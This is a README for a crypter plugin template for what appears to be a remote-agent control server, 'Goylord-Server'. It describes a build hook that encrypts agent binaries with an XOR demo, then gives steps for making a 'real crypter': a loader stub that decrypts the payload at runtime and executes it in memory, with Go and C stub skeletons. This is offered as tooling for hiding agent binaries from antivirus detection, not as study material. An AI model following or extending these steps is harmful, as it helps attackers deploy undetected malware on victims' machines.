# Crypter Template Plugin

A server-only build plugin template that demonstrates how to transform built agent binaries. Use this as a starting point for creating your own crypter plugin.

## What It Does

When enabled on the Build page, this plugin intercepts each build artifact after compilation and transforms the binary using the selected method. The demo includes a working XOR transform; RC4 and AES are placeholders.

## Install

1. Run `build.bat` to create `crypter-template.zip`
2. Upload the zip from the Plugins page, or place it under `Goylord-Server/plugins/`
3. Enable the plugin in the Plugin Manager

## Use

1. Go to the Build page
2. In the **Build Plugins** section, enable **Crypter**
3. Select a method (XOR demo, RC4 placeholder, AES-256 placeholder)
4. Enter an encryption key
5. Select your target platforms and build
6. The downloaded file will be the transformed binary

## How to Make a Real Crypter

1. **Replace the transform functions** in `server.js` with your actual encryption logic
2. **Write a loader stub** that decrypts the payload at runtime and executes in memory
3. **Combine stub + encrypted payload** — either prepend the stub or append the encrypted section
4. **Update `config.json`** settings to match your interface (different methods, keys, options)

### Loader Stub Pattern (Go)

```go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "os"
)

func main() {
    // Read encrypted payload from embedded section or file
    encrypted, _ := os.ReadFile(os.Args[0])
    // Decrypt with your key
    // Execute decrypted PE in memory
}
```

### Loader Stub Pattern (C)

```c
#include <windows.h>
#include <wincrypt.h>

// Read encrypted PE from resource or appended section
// Decrypt with CryptoAPI or BCrypt
// Map PE into memory
// Execute entry point
```

## Source Code References

| File | Line | Purpose |
|------|------|---------|
| `Goylord-Server/src/server/build-process.ts` | 2095-2158 | `onBuildArtifact` hook execution |
| `Goylord-Server/src/server/build-process.ts` | 148-196 | Build hook runner infrastructure |
| `Goylord-Server/src/server/plugin-runtime/worker-host.ts` | 144-184 | Worker host hook dispatch |
| `Goylord-Server/public/assets/build.js` | 367-452 | Build plugin UI rendering |
| `Goylord-Server/src/server/routes/build-routes.ts` | 71-127 | Plugin settings sanitization |
| `Goylord-Server/src/server/routes/build-routes.ts` | 563-581 | Build plugin API endpoint |
